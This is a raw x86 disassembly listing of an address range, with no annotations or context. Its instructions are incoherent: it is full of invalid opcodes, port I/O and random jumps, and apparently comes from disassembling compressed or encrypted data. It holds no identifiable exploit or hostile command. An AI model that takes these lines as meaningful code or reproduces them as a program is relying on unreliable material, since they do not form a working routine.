  41990e:	sbb    eax,0xe69f75c8
  419913:	out    dx,al
  419914:	(bad)  
  419915:	jb     0x4198ea
  419917:	std    
  419918:	jb     0x419940
  41991a:	(bad)  
  41991b:	aad    0x86
  41991d:	rol    ebx,0x98
  419920:	test   edx,edx
  419922:	lods   al,BYTE PTR ds:[esi]
  419923:	rcl    BYTE PTR [ebp-0x4f3e4ede],1
  419929:	stc    
  41992a:	ret    
  41992b:	or     cl,BYTE PTR [eax-0x28e16aa2]
  419931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419932:	mov    ds:0xd79293c0,al
  419937:	(bad)  
  419938:	and    eax,0x85c9af14
  41993d:	adc    BYTE PTR [edx+0x1db07136],bh
  419943:	adc    DWORD PTR [ebx+0x69381df1],esi
  419949:	mov    bh,0x20
  41994b:	pushf  
  41994c:	mov    ds:0xeca2a86e,eax
  419951:	lds    ebx,FWORD PTR [edx+eax*8]
  419954:	jnp    0x4198e2
  419956:	pop    esp
  419957:	repz aad 0xc6
  41995a:	jge    0x419953
  41995c:	loop   0x419974
  41995e:	fld    TBYTE PTR [ebx]
  419960:	push   ebx
  419961:	cld    
  419962:	fcmove st,st(3)
  419964:	stc    
  419965:	pop    edi
  419966:	neg    DWORD PTR [edi-0x233dd2db]
  41996c:	mov    ebx,0x9bb278f2
  419971:	aam    0x49
  419973:	pop    ebx
  419974:	cs xchg ebx,eax
  419976:	lea    ecx,[edx]
  419978:	push   esp
  419979:	fnstcw WORD PTR [ebp-0x554348e7]
  41997f:	xor    ecx,edi
  419981:	ins    BYTE PTR es:[edi],dx
  419982:	ins    BYTE PTR es:[edi],dx
  419983:	sti    
  419984:	xor    esi,ecx
  419986:	fld    QWORD PTR [edx+edx*1]
  419989:	(bad)  
  41998a:	push   ds
  41998b:	fdivr  QWORD PTR [edx]
  41998d:	add    BYTE PTR [ebx-0x21],dh
  419990:	or     eax,0x7d98bda3
  419995:	shl    DWORD PTR [edi-0x3bb42811],1
  41999b:	mov    BYTE PTR [edx],bh
  41999d:	mov    bl,0xf6
  41999f:	cld    
  4199a0:	mov    ebp,0xac723736
  4199a5:	cmp    eax,0x66ad6d41
  4199aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ab:	jmp    0x419a21
  4199ad:	dec    edi
  4199ae:	retf   
  4199af:	and    DWORD PTR [eax+0x2b07e913],0x46b0d68f
  4199b9:	stos   DWORD PTR es:[edi],eax
  4199ba:	push   ds
  4199bb:	js     0x419948
  4199bd:	in     al,dx
  4199be:	push   cs
  4199bf:	icebp  
  4199c0:	jle    0x4199a9
  4199c2:	fsubr  DWORD PTR [eax]
  4199c4:	cmp    dl,BYTE PTR [ebx+0x79fca4d5]
  4199ca:	sbb    DWORD PTR [edx],0xf20ad3b8
  4199d0:	cmp    BYTE PTR [edx+0x252e3843],bl
  4199d6:	jge    0x419991
  4199d8:	leave  
  4199d9:	lods   al,BYTE PTR cs:[esi]
  4199db:	add    bl,BYTE PTR [ecx+0x69]
  4199de:	mov    ah,0xdc
  4199e0:	cmc    
  4199e1:	adc    eax,0xbfd7ec28
  4199e6:	and    eax,0x78837b8a
  4199eb:	xor    bl,dl
  4199ed:	push   cs
  4199ee:	sahf   
  4199ef:	(bad)  
  4199f0:	popf   
  4199f1:	cmp    edx,esp
  4199f3:	ins    DWORD PTR es:[edi],dx
  4199f4:	xor    eax,0xe3c7c088
  4199f9:	pop    esi
  4199fa:	sti    
  4199fb:	pop    ss
  4199fc:	int    0x4f
  4199fe:	jmp    0x1ed1:0x1ee7e6fd
  419a05:	lea    ecx,[edx]
  419a07:	cs jo  0x419a3b
  419a0a:	popf   
  419a0b:	pop    ss
  419a0c:	mov    DWORD PTR [ecx],esp
  419a0e:	fstp   TBYTE PTR [eax+0x3a144c4a]
  419a14:	addr16 addr16 ds pop ds
  419a18:	pusha  
  419a19:	cli    
  419a1a:	into   
  419a1b:	fst    st(1)
  419a1d:	lahf   
  419a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a1f:	aad    0xf3
  419a21:	fs dec ebx
  419a23:	jbe    0x419a0e
  419a25:	sbb    eax,ebx
  419a27:	xchg   ecx,eax
  419a28:	cmp    edi,DWORD PTR [esi+0x4e]
  419a2b:	inc    ebp
  419a2c:	lods   eax,DWORD PTR ds:[esi]
  419a2d:	push   esp
  419a2e:	dec    ecx
  419a2f:	push   edi
  419a30:	ret    
  419a31:	fdiv   DWORD PTR [eax+0x62]
  419a34:	lods   al,BYTE PTR ds:[esi]
  419a35:	mov    eax,0x88c54362
  419a3a:	sti    
  419a3b:	jb     0x419a8c
  419a3d:	or     DWORD PTR [ecx+0x54904343],edi
  419a43:	inc    esi
  419a44:	sbb    ah,BYTE PTR [edi-0x62]
  419a47:	dec    eax
  419a48:	inc    edi
  419a49:	xchg   esp,eax
  419a4a:	inc    esp
  419a4b:	mov    esi,0x68dda4a3
  419a50:	scas   al,BYTE PTR es:[edi]
  419a51:	xor    dl,BYTE PTR [edx+0x6b2f4a0b]
  419a57:	pop    edx
  419a58:	loop   0x419a5c
  419a5a:	adc    BYTE PTR ds:[edi+0x47cfb2ea],dh
  419a61:	into   
  419a62:	retf   0x6c02
  419a65:	sbb    al,0xb5
  419a67:	imul   esp,DWORD PTR [ebp-0x1b2a252b],0xffffffdc
  419a6e:	pop    esi
  419a6f:	imul   esp,DWORD PTR [ecx],0xffffffe5
  419a72:	ds inc ebp
  419a74:	int    0xc0
  419a76:	and    ebp,DWORD PTR [edi]
  419a78:	iret   
  419a79:	int3   
  419a7a:	fwait
  419a7b:	push   edi
  419a7c:	or     esp,DWORD PTR [eax+0x3c8002b6]
  419a82:	inc    edx
  419a83:	js     0x419ac1
  419a85:	ror    DWORD PTR [esi-0x2bff705f],0x7d
  419a8c:	xor    esi,ecx
  419a8e:	sub    BYTE PTR [ecx],al
  419a90:	mov    ecx,0x8ff7fd87
  419a95:	test   edx,esi
  419a97:	xchg   BYTE PTR [ebp-0x7b],cl
  419a9a:	sbb    eax,0xd478aba1
  419a9f:	mov    esp,0x64874f78
  419aa4:	sub    eax,0xc4014cf5
  419aa9:	scas   eax,DWORD PTR es:[edi]
  419aaa:	jl     0x419a85
  419aac:	test   al,0xcb
  419aae:	jae    0x419abd
  419ab0:	jmp    0x419aa3
  419ab2:	fs icebp 
  419ab4:	pop    ecx
  419ab5:	xor    DWORD PTR ds:0xd9bf131f,esp
  419abb:	xor    DWORD PTR [eax+eiz*2+0x42],ebp
  419abf:	cmp    cl,BYTE PTR [ebp+edx*2-0x3f1ba16e]
  419ac6:	lods   eax,DWORD PTR ds:[esi]
  419ac7:	xchg   esi,eax
  419ac8:	jns    0x419a99
  419aca:	jp     0x419b32
  419acc:	ins    BYTE PTR es:[edi],dx
  419acd:	push   ecx
  419ace:	repz mov esi,0xd061b0f4
  419ad4:	int3   
  419ad5:	dec    edx
  419ad6:	out    dx,al
  419ad7:	xchg   ebp,eax
  419ad8:	shl    DWORD PTR [ecx-0xafcef3f],1
  419ade:	mov    ch,ch
  419ae0:	jnp    0x419af7
  419ae2:	or     ebx,esi
  419ae4:	push   0x6fd1c762
  419ae9:	or     eax,edi
  419aeb:	push   edx
  419aec:	xor    al,0x8f
  419aee:	xchg   edx,eax
  419aef:	rdpmc  
  419af1:	lea    ebp,[edi-0x44]
  419af4:	in     eax,dx
  419af5:	in     eax,dx
  419af6:	mov    eax,DWORD PTR [edx+0x2434c2dc]
  419afc:	repz mov cl,0x31
  419aff:	out    0xab,eax
  419b01:	cdq    
  419b02:	std    
  419b03:	imul   edi,eax,0x2d
  419b06:	call   0x131a6322
  419b0b:	inc    edi
  419b0c:	out    dx,eax
  419b0d:	cs push 0x7e
  419b10:	loop   0x419b5e
  419b12:	inc    edi
  419b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b14:	call   0xef782282
  419b19:	in     eax,dx
  419b1a:	(bad)  
  419b1b:	and    BYTE PTR [ebx],al
  419b1d:	pop    esp
  419b1e:	lahf   
  419b1f:	xor    al,0xa5
  419b21:	xchg   ebp,eax
  419b22:	xchg   BYTE PTR [eax-0x67bbb377],dh
  419b28:	xchg   edi,eax
  419b29:	ret    
  419b2a:	xchg   DWORD PTR [edi+0x7002368f],esi
  419b30:	test   DWORD PTR [eax+esi*2+0x572772b4],0xd478532d
  419b3b:	aaa    
  419b3c:	fcmovnu st,st(2)
  419b3e:	outs   dx,BYTE PTR ds:[esi]
  419b3f:	aaa    
  419b40:	sub    al,0xc5
  419b42:	xlat   BYTE PTR ds:[ebx]
  419b43:	clc    
  419b44:	(bad)  
  419b45:	jne    0x419b81
  419b47:	xor    al,0xc4
  419b49:	jnp    0x419bbe
  419b4b:	or     eax,0x571fbb08
  419b50:	(bad)  
  419b52:	stc    
  419b53:	popa   
  419b54:	jg     0x419b12
  419b56:	xlat   BYTE PTR ds:[ebx]
  419b57:	lock xor al,0x8b
  419b5a:	out    dx,al
  419b5b:	and    DWORD PTR [edi+0x2a2dc426],ecx
  419b61:	(bad)  
  419b62:	mov    cl,0x1f
  419b64:	mov    bh,0x4a
  419b66:	adc    BYTE PTR [edi+0xf],0xe7
  419b6a:	fidiv  WORD PTR [esi+ebx*2]
  419b6d:	push   0x1e
  419b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b70:	aad    0x59
  419b72:	xor    ecx,edx
  419b74:	mov    WORD PTR [ecx],ds
  419b76:	mov    esi,0x5e0a4578
  419b7b:	ins    DWORD PTR es:[edi],dx
  419b7c:	push   cs
  419b7d:	cmp    ebx,esi
  419b7f:	sub    DWORD PTR [ebx-0x7b],ecx
  419b82:	bound  esp,QWORD PTR [edx+0x3391c6c8]
  419b88:	aad    0x91
  419b8a:	and    DWORD PTR [edx-0x77275e1d],ebx
  419b90:	mov    dh,0x45
  419b92:	sub    esp,DWORD PTR [esi+0x45]
  419b95:	fidivr WORD PTR [eax]
  419b97:	dec    edi
  419b98:	mov    ch,ch
  419b9a:	(bad)  
  419b9b:	or     WORD PTR [esi+0xb],sp
  419b9f:	cs xchg edi,eax
  419ba1:	cli    
  419ba2:	add    dh,al
  419ba4:	and    eax,0xd46b398
  419ba9:	jecxz  0x419bad
  419bab:	loop   0x419c00
  419bad:	add    al,0x84
  419baf:	popa   
  419bb0:	addr16 icebp 
  419bb2:	pop    edi
  419bb3:	jle    0x419bf9
  419bb5:	xor    bl,al
  419bb7:	mov    ds:0x12bd1353,eax
  419bbc:	inc    eax
  419bbd:	xchg   edx,eax
  419bbe:	pop    es
  419bbf:	test   bh,ch
  419bc1:	out    dx,al
  419bc2:	add    bl,BYTE PTR ds:0x267c8584
  419bc8:	push   eax
  419bc9:	aam    0x7b
  419bcb:	cmp    ebp,DWORD PTR [ebx-0x17]
  419bce:	and    eax,0xaa003b8e
  419bd3:	das    
  419bd4:	shr    DWORD PTR [ebx+0x5c],0xf1
  419bd8:	mov    cl,0xfd
  419bda:	cs jp  0x419b68
  419bdd:	cmp    al,0x6d
  419bdf:	or     ebx,DWORD PTR [esi]
  419be1:	sbb    BYTE PTR [ecx],ch
  419be3:	int3   
  419be4:	int3   
  419be5:	adc    al,0x2c
  419be7:	arpl   WORD PTR [eax-0x56],dx
  419bea:	push   esp
  419beb:	jmp    0x419c4e
  419bed:	xchg   edi,eax
  419bee:	mov    al,ds:0x20ada58d
  419bf3:	int3   
  419bf4:	fsubr  st,st(6)
  419bf6:	ss xchg edx,eax
  419bf8:	add    al,0xee
  419bfa:	pop    ecx
  419bfb:	sbb    eax,0xbcc9708e
  419c00:	neg    BYTE PTR [esp+edx*1-0x6a81edc8]
  419c07:	lods   eax,DWORD PTR ds:[esi]
  419c08:	sub    BYTE PTR [eax+0x637a3a03],ah
  419c0e:	sub    cl,0xee
  419c11:	jno    0x419c18
  419c13:	mov    WORD PTR [esi-0x2e],?
  419c16:	pop    eax
  419c17:	jge    0x419bf4
  419c19:	jl     0x419c5d
  419c1b:	or     DWORD PTR [esi],ecx
  419c1d:	xor    eax,0x23bb4691
  419c22:	outs   dx,BYTE PTR ds:[esi]
  419c23:	mov    ebp,ebx
  419c25:	mov    ah,BYTE PTR [eax-0x57]
  419c28:	and    edi,DWORD PTR [edx-0x2e]
  419c2b:	clc    
  419c2c:	ja     0x419c9d
  419c2e:	fs das 
  419c30:	add    cl,bl
  419c32:	mov    edi,0x64abf7
  419c37:	xchg   edi,eax
  419c38:	and    DWORD PTR [edi-0x490d26e2],0xffffff84
  419c3f:	imul   ecx,DWORD PTR [esi+0x77],0x9ecad6c8
  419c46:	fisubr DWORD PTR [edi]
  419c48:	in     eax,0x8
  419c4a:	pop    ecx
  419c4b:	pop    edi
  419c4c:	scas   eax,DWORD PTR es:[edi]
  419c4d:	pop    eax
  419c4e:	mov    edi,esi
  419c50:	adc    dl,al
  419c52:	fisttp WORD PTR [ecx-0x71]
  419c55:	mov    esi,0xd2729864
  419c5a:	push   esp
  419c5b:	mov    bh,BYTE PTR [edx-0x41f92575]
  419c61:	jb     0x419c3f
  419c63:	xchg   esi,eax
  419c64:	jge    0x419c13
  419c66:	inc    ebx
  419c67:	mov    edx,0x6d02c53b
  419c6c:	sahf   
  419c6d:	test   BYTE PTR [esi],dl
  419c6f:	add    ch,BYTE PTR [eax+0x7d]
  419c72:	adc    al,0x61
  419c74:	out    0x1f,al
  419c76:	retf   
  419c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c78:	int3   
  419c79:	dec    ecx
  419c7a:	push   ds
  419c7b:	adc    ah,BYTE PTR ds:0x3454e778
  419c81:	sub    eax,0xdb3ef223
  419c86:	xchg   ecx,eax
  419c87:	add    al,0xc6
  419c89:	add    BYTE PTR [ecx*4-0x28642f3a],0x8f
  419c91:	enter  0xdd52,0x85
  419c95:	fst    DWORD PTR es:[ebp-0x2f]
  419c99:	pop    eax
  419c9a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419c9c:	xchg   BYTE PTR [edx-0x1fbd40fb],dh
  419ca2:	jne    0x419c9b
  419ca4:	xor    al,0x6f
  419ca6:	pushf  
  419ca7:	sbb    al,0xd0
  419ca9:	outs   dx,DWORD PTR ds:[esi]
  419caa:	scas   al,BYTE PTR es:[edi]
  419cab:	mov    edi,0xc01e0dd3
  419cb0:	repz mov ebx,0x572f1280
  419cb6:	gs push ecx
  419cb8:	jle    0x419ccc
  419cba:	jg     0x419c57
  419cbc:	or     eax,edi
  419cbe:	nop
  419cbf:	repz into 
  419cc1:	cmp    BYTE PTR [ebp+0x67],bh
  419cc4:	mov    cl,0xf4
  419cc6:	out    dx,al
  419cc7:	and    esp,edx
  419cc9:	xchg   edi,eax
  419cca:	and    DWORD PTR [edi],ebx
  419ccc:	adc    al,0x5a
  419cce:	mov    WORD PTR [ebp-0x65],cs
  419cd1:	sub    al,dh
  419cd3:	inc    ecx
  419cd4:	cmp    edx,edi
  419cd6:	pop    esp
  419cd7:	mov    bh,0xa5
  419cd9:	sbb    edi,DWORD PTR [eax+0x561d927f]
  419cdf:	in     al,0xfc
  419ce1:	xor    eax,0x8c030772
  419ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ce7:	mov    esi,0xa631a236
  419cec:	imul   ebp,DWORD PTR [ecx],0xffffff86
  419cef:	mov    ?,WORD PTR [edx+0x43]
  419cf2:	push   ss
  419cf3:	shl    eax,0xe2
  419cf6:	add    al,0x2c
  419cf8:	inc    ebp
  419cf9:	aad    0x36
  419cfb:	repnz popf 
  419cfd:	jb     0x419cdf
  419cff:	adc    DWORD PTR [ebp+0x4c],edi
  419d02:	in     eax,dx
  419d03:	mov    ch,0x9b
  419d05:	and    edi,ecx
  419d07:	(bad)  
  419d08:	dec    edx
  419d09:	mov    dh,0xa7
  419d0b:	or     edx,DWORD PTR [eax]
  419d0d:	add    BYTE PTR [eax],al
  419d0f:	add    BYTE PTR [eax],al
  419d11:	add    BYTE PTR [eax-0x329b3fbb],cl
  419d17:	in     eax,0xac
  419d19:	in     eax,dx
  419d1a:	or     dh,BYTE PTR [ebp+0x2f68077c]
  419d20:	aad    0x8c
  419d22:	ret    
  419d23:	sbb    DWORD PTR [ecx],eax
  419d25:	add    bl,dh
  419d27:	add    al,0x0
  419d29:	add    BYTE PTR [edi+0x5c0bece9],ah
  419d2f:	bswap  ebx
  419d31:	mov    edx,0xa13b0d17
  419d36:	pop    ecx
  419d37:	mov    ds:0x1c2d0a2c,ax
  419d3d:	dec    edx
  419d3e:	pushf  
  419d3f:	cmp    ch,dl
  419d41:	cdq    
  419d42:	xlat   BYTE PTR ds:[ebx]
  419d43:	push   edi
  419d44:	xchg   eax,ebx
  419d46:	sub    eax,0xbf3c605a
  419d4b:	xor    dl,BYTE PTR [esi-0x1f]
  419d4e:	cmp    eax,DWORD PTR [edx-0x3115d724]
  419d54:	jb     0x419d91
  419d56:	mov    al,0x3d
  419d58:	dec    ecx
  419d59:	jo     0x419d2b
  419d5b:	xor    DWORD PTR [edi+0x64],0xfffffff3
  419d5f:	adc    bl,BYTE PTR [edi+0x25]
  419d62:	bound  esi,QWORD PTR [esi-0x5e]
  419d65:	xchg   ebx,eax
  419d66:	mov    eax,0x6e0671bb
  419d6b:	add    BYTE PTR ds:0xe22752a2,al
  419d71:	mov    ebp,0x3e347751
  419d76:	mov    DWORD PTR [edx],esp
  419d78:	test   eax,0x5161f5f6
  419d7d:	inc    edi
  419d7e:	ds ret 
  419d80:	mov    esi,0xfe49c917
  419d85:	(bad)  
  419d86:	push   esi
  419d87:	pop    esp
  419d88:	pop    esp
  419d89:	ds call 0x252c5334
  419d8f:	enter  0xeb5f,0xa
  419d93:	jbe    0x419de0
  419d95:	cmc    
  419d96:	xlat   BYTE PTR fs:[ebx]
  419d98:	dec    esp
  419d99:	sub    eax,0xce5d900e
  419d9e:	iret   
  419d9f:	push   edi
  419da0:	sub    eax,DWORD PTR [eax]
  419da2:	fld    DWORD PTR [edi+ecx*8]
  419da5:	push   edx
  419da6:	ret    0xd3f2
  419da9:	lea    edi,[eax+ebp*4]
  419dac:	mov    bh,BYTE PTR [eax]
  419dae:	push   cs
  419daf:	add    al,0xa0
  419db1:	push   ss
  419db2:	sbb    eax,DWORD PTR [eax+0x78]
  419db5:	jp     0x419df4
  419db7:	jno    0x419d8d
  419db9:	and    al,0xbb
  419dbb:	sub    DWORD PTR [ebx],ebp
  419dbd:	sar    BYTE PTR [ecx],1
  419dbf:	pop    ebx
  419dc0:	push   edx
  419dc1:	mov    edi,esp
  419dc3:	rcr    DWORD PTR [ebp-0x28],1
  419dc6:	xchg   esp,eax
  419dc7:	jo     0x419e32
  419dc9:	cwde   
  419dca:	test   al,0x6a
  419dcc:	(bad)  
  419dcd:	jmp    0x52945558
  419dd2:	cwde   
  419dd3:	out    dx,al
  419dd4:	and    al,0xae
  419dd6:	ret    
  419dd7:	mov    ebx,0xced6dc2a
  419ddc:	inc    eax
  419ddd:	mov    edx,0x62ffcbb
  419de2:	xchg   ebp,eax
  419de3:	dec    eax
  419de4:	jle    0x419e03
  419de6:	jne    0x419e16
  419de8:	sbb    cl,BYTE PTR [ebp-0x4]
  419deb:	xor    al,0x31
  419ded:	xchg   ebx,eax
  419dee:	add    ebx,DWORD PTR [esi+0x13]
  419df1:	stos   DWORD PTR es:[edi],eax
  419df2:	ret    
  419df3:	mov    edi,0xfd5ed9a4
  419df8:	les    ebx,FWORD PTR [edx-0x53]
  419dfb:	pop    esi
  419dfc:	mov    al,ds:0x456a61b9
  419e01:	pop    ds
  419e02:	lods   eax,DWORD PTR ds:[esi]
  419e03:	dec    esi
  419e04:	out    dx,eax
  419e05:	pop    eax
  419e06:	xlat   BYTE PTR ds:[ebx]
  419e07:	hlt    
  419e08:	shr    ah,cl
  419e0a:	les    eax,FWORD PTR [esi]
  419e0c:	dec    ecx
  419e0d:	inc    ebx
  419e0e:	stos   DWORD PTR es:[edi],eax
  419e0f:	jecxz  0x419e4c
  419e11:	repnz cs (bad) 
  419e14:	cmc    
  419e15:	imul   edx,DWORD PTR [ecx+ecx*1+0x20],0x36
  419e1a:	cmp    BYTE PTR [eax],dh
  419e1c:	rcr    BYTE PTR [edi*8-0xf8bea79],cl
  419e23:	leave  
  419e24:	sbb    al,0x6
  419e26:	push   0xffffffa4
  419e28:	sub    ah,BYTE PTR [ebp-0x68]
  419e2b:	test   DWORD PTR [edi+esi*4+0x30],esp
  419e2f:	mov    edx,0x934d9476
  419e34:	add    dh,BYTE PTR [ebx+ecx*8-0x62]
  419e38:	jne    0x419e00
  419e3a:	xor    eax,0xfa4d7b48
  419e3f:	jno    0x419dda
  419e41:	aas    
  419e42:	addr16 sbb ebx,ebp
  419e45:	push   esp
  419e46:	push   0x30605735
  419e4b:	int3   
  419e4c:	pusha  
  419e4d:	loope  0x419e83
  419e4f:	push   eax
  419e50:	int    0x77
  419e52:	cmp    DWORD PTR [eiz*1-0x25c5a642],edx
  419e59:	jge    0x419df2
  419e5b:	jnp    0x419e4d
  419e5d:	and    BYTE PTR [eax-0x7],0x57
  419e61:	data16 jo 0x419e40
  419e64:	sbb    DWORD PTR [ebx-0x41cc2f73],esp
  419e6a:	fdiv   DWORD PTR [esi+edi*4]
  419e6d:	inc    ebp
  419e6e:	out    0xa1,eax
  419e70:	dec    edx
  419e71:	xchg   ah,al
  419e73:	jb     0x419eed
  419e75:	cmc    
  419e76:	xor    bh,BYTE PTR [esi]
  419e78:	jno    0x419e08
  419e7a:	or     BYTE PTR [edi+0x40],0x10
  419e7e:	push   ss
  419e7f:	push   0x90e344f8
  419e84:	mov    eax,0x431bb427
  419e89:	mov    ds:0xfb9e3b24,al
  419e8e:	sub    DWORD PTR [edi],esp
  419e90:	inc    ebx
  419e91:	adc    ecx,ebp
  419e93:	and    al,0x33
  419e95:	push   ebx
  419e96:	repz fcomp DWORD PTR [esi]
  419e99:	xor    al,0x35
  419e9b:	addr16 sbb al,0x60
  419e9e:	ins    DWORD PTR es:[edi],dx
  419e9f:	inc    ebp
  419ea0:	aad    0x3f
  419ea2:	hlt    
  419ea3:	cmp    eax,0x697e2326
  419ea8:	cld    
  419ea9:	jge    0x419eef
  419eab:	push   cs
  419eac:	lods   eax,DWORD PTR ds:[esi]
  419ead:	inc    ebx
  419eae:	dec    ecx
  419eaf:	ja     0x419f26
  419eb1:	je     0x419f01
  419eb3:	hlt    
  419eb4:	sti    
  419eb5:	mov    esi,0xeec6f4e1
  419eba:	lods   eax,DWORD PTR ds:[esi]
  419ebb:	rcr    DWORD PTR [edx],1
  419ebd:	fsubr  st(6),st
  419ebf:	xchg   ebp,eax
  419ec0:	call   0xd74bd598
  419ec5:	dec    BYTE PTR [eax-0x64e52c83]
  419ecb:	sbb    ch,dl
  419ecd:	push   ebx
  419ece:	repnz or ebp,0x4ddce341
  419ed5:	sar    DWORD PTR [esi+0x6c],0xc2
  419ed9:	and    bl,BYTE PTR [ebx]
  419edb:	loop   0x419e8e
  419edd:	cmp    al,0x4e
  419edf:	lea    ecx,[eax]
  419ee1:	xchg   esi,eax
  419ee2:	test   bl,0x80
  419ee5:	inc    esi
  419ee6:	leave  
  419ee7:	pushf  
  419ee8:	xchg   esp,eax
  419ee9:	inc    esi
  419eea:	stc    
  419eeb:	into   
  419eec:	pop    ecx
  419eed:	das    
  419eee:	mov    esp,0x54619625
  419ef3:	xor    ebx,DWORD PTR [edx-0x17]
  419ef6:	cs ret 
  419ef8:	test   DWORD PTR [edi],0x873a9c2a
  419efe:	pop    esi
  419eff:	shr    BYTE PTR [ebp+0x1f],0x7f
  419f03:	lods   al,BYTE PTR ds:[esi]
  419f04:	adc    edx,DWORD PTR [ebp+0x73]
  419f07:	loop   0x419f78
  419f09:	outs   dx,DWORD PTR ds:[esi]
  419f0a:	pop    ss
  419f0b:	stos   BYTE PTR es:[edi],al
  419f0c:	sbb    DWORD PTR [ecx],eax
  419f0e:	imul   eax,DWORD PTR [edi],0xffffffb9
  419f11:	jmp    0x2488:0xf63ca9b0
  419f18:	andps  xmm7,XMMWORD PTR [edi+0x28]
  419f1c:	es cmp eax,0x7f09a4dd
  419f22:	and    eax,0xa910c472
  419f27:	or     al,0xdc
  419f29:	push   ebx
  419f2a:	sub    al,0x6c
  419f2c:	out    0xcd,al
  419f2e:	(bad)  [ebx-0x262db2fa]
  419f34:	rcl    DWORD PTR [eax+edi*2+0x34a9e7e4],1
  419f3b:	cdq    
  419f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f3d:	leave  
  419f3e:	stos   BYTE PTR es:[edi],al
  419f3f:	nop
  419f40:	jmp    0x419f4b
  419f42:	aaa    
  419f43:	lock das 
  419f45:	shl    DWORD PTR [edi-0x53b0c6c8],1
  419f4b:	mov    ds:0x935f8601,eax
  419f50:	or     bh,al
  419f52:	jbe    0x419f71
  419f54:	mov    cl,BYTE PTR [ebp*2-0x70155ec1]
  419f5b:	fisub  WORD PTR [esi]
  419f5d:	jmp    DWORD PTR [ebp-0x466cbdf1]
  419f63:	cmp    BYTE PTR [edx],al
  419f65:	sbb    eax,0x5139ed0d
  419f6a:	(bad)  
  419f6b:	enter  0x1eda,0xe6
  419f6f:	add    al,0x86
  419f71:	ret    0xa862
  419f74:	mov    cl,BYTE PTR [edx-0x1fdc44b3]
  419f7a:	imul   edx,ebx,0xdcfb9d93
  419f80:	mov    esi,0x57b0c2f
  419f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f87:	retf   
  419f88:	jns    0x419f0f
  419f8a:	arpl   WORD PTR [ebx],ax
  419f8c:	lods   al,BYTE PTR ds:[esi]
  419f8d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f8f:	mov    al,0x1f
  419f91:	xchg   ebx,eax
  419f92:	lea    ecx,[edi+eax*8-0x38]
  419f96:	push   esp
  419f97:	imul   ebp,DWORD PTR [ecx],0x9234cb19
  419f9d:	popf   
  419f9e:	nop
  419f9f:	pop    esi
  419fa0:	ret    0x441
  419fa3:	or     DWORD PTR [esi+0x24],edx
  419fa6:	add    ecx,DWORD PTR [esi]
  419fa8:	adc    al,0x4c
  419faa:	dec    esp
  419fab:	jmp    0xe488b617
  419fb0:	pop    edx
  419fb1:	ret    
  419fb2:	push   edi
  419fb3:	mov    esi,0xda156121
  419fb8:	jo     0x41a035
  419fba:	jge    0x419f51
  419fbc:	out    0xa3,eax
  419fbe:	in     eax,0x8d
  419fc0:	sahf   
  419fc1:	xchg   ecx,eax
  419fc2:	mov    ebp,esp
  419fc4:	lahf   
  419fc5:	rcr    DWORD PTR [ebp+0x4066530b],1
  419fcb:	aas    
  419fcc:	cmp    esi,DWORD PTR [esi+0x21]
  419fcf:	cmp    BYTE PTR [edx-0x73b6b2da],al
  419fd5:	mov    ah,0x2e
  419fd7:	cmp    eax,0x15eecec
  419fdc:	repnz mov esp,0x31617d54
  419fe2:	xor    BYTE PTR [esi],al
  419fe4:	jmp    0x570a:0xf3e943e4
  419feb:	pop    ebx
  419fec:	sbb    BYTE PTR [edi],0x87
  419fef:	cmp    DWORD PTR [ebx+0x790d398f],ecx
  419ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ff6:	lds    edi,FWORD PTR [ebp+ebx*8-0x1b]
  419ffa:	in     al,dx
  419ffb:	jo     0x419fe1
  419ffd:	pop    ss
  419ffe:	cmp    cl,0x50
  41a001:	sbb    BYTE PTR [edx],0x51
  41a004:	ins    BYTE PTR es:[edi],dx
  41a005:	pushf  
  41a006:	fwait
  41a007:	mov    eax,ds:0xdd381aab
  41a00c:	(bad)  
  41a00d:	fsubr  QWORD PTR [esi+0x18f46bfd]
  41a013:	retf   
  41a014:	outs   dx,BYTE PTR ds:[esi]
  41a015:	mov    bh,0xe6
  41a017:	retf   0x2bbf
  41a01a:	je     0x419fb2
  41a01c:	stos   DWORD PTR es:[edi],eax
  41a01d:	mov    DWORD PTR [esi+0x5a],ebp
  41a020:	ret    
  41a021:	mov    ds:0x284621cd,eax
  41a026:	mov    bl,BYTE PTR [ebx-0x52]
  41a029:	std    
  41a02a:	sbb    eax,0xcb4bf13e
  41a02f:	out    dx,eax
  41a030:	dec    ebx
  41a031:	cmp    al,0x9c
  41a033:	stos   BYTE PTR es:[edi],al
  41a034:	mov    edx,0xa7b0889
  41a039:	fmul   QWORD PTR [edx]
  41a03b:	fldcw  WORD PTR [ebx+0x1f]
  41a03e:	fcomp  DWORD PTR [ecx-0x753d8491]
  41a044:	ret    
  41a045:	mov    al,0x79
  41a047:	dec    ebx
  41a048:	cmp    DWORD PTR [ebp-0x2b62e6e9],ebp
  41a04e:	shr    BYTE PTR [eax+eax*2],cl
  41a051:	int    0x2f
  41a053:	dec    ecx
  41a054:	xchg   BYTE PTR [ecx+0x6bd3234d],cl
  41a05a:	pushf  
  41a05b:	aam    0x1f
  41a05d:	add    al,0x6e
  41a05f:	pop    ebp
  41a060:	cmp    ch,bh
  41a062:	ins    DWORD PTR es:[edi],dx
  41a063:	(bad)  
  41a064:	xchg   esi,eax
  41a065:	lea    edi,[eax-0x1d]
  41a068:	lds    esi,FWORD PTR [ebp-0x54603d32]
  41a06e:	mov    edi,edx
  41a070:	rcr    BYTE PTR [eax+0x51],1
  41a073:	sbb    edi,DWORD PTR [ecx]
  41a075:	mov    cl,0xdc
  41a077:	ins    BYTE PTR es:[edi],dx
  41a078:	adc    eax,0xd89bdf9b
  41a07d:	and    eax,0xe30c71a4
  41a082:	sbb    ecx,ecx
  41a084:	inc    ebx
  41a085:	or     eax,0x89cdd4ba
  41a08a:	int    0x41
  41a08c:	out    0xe5,eax
  41a08e:	loope  0x41a067
